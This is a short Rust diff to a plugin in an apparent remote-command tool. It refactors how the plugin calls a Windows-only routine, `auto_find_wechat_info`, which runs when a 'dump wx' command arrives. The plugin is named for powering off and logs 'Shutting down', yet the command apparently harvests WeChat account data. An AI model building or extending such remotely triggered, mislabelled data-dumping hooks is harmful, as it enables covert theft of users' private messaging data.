@@ -2,8 +2,6 @@ use tracing::{info, warn};
 use yizhan_plugin::Plugin;
 use yizhan_protocol::command::{UserCommand, UserCommandResponse, UserCommandResult};
 
-use crate::dump::auto_find_wechat_info;
-
 #[cfg(windows)]
 mod dump;
 
@@ -26,7 +24,7 @@ impl Plugin for YiZhanPowerOffPlugin {
         if matches!((group_id, content), ("dump", "wx")) {
             info!("Shutting down ...");
 
-            Some(match auto_find_wechat_info() {
+            Some(match dump::auto_find_wechat_info() {
                 Err(err) => {
                     warn!("find wechat info error: {:?}", err);
                     UserCommandResult::Err(format!("find wechat info error: {:?}", err))
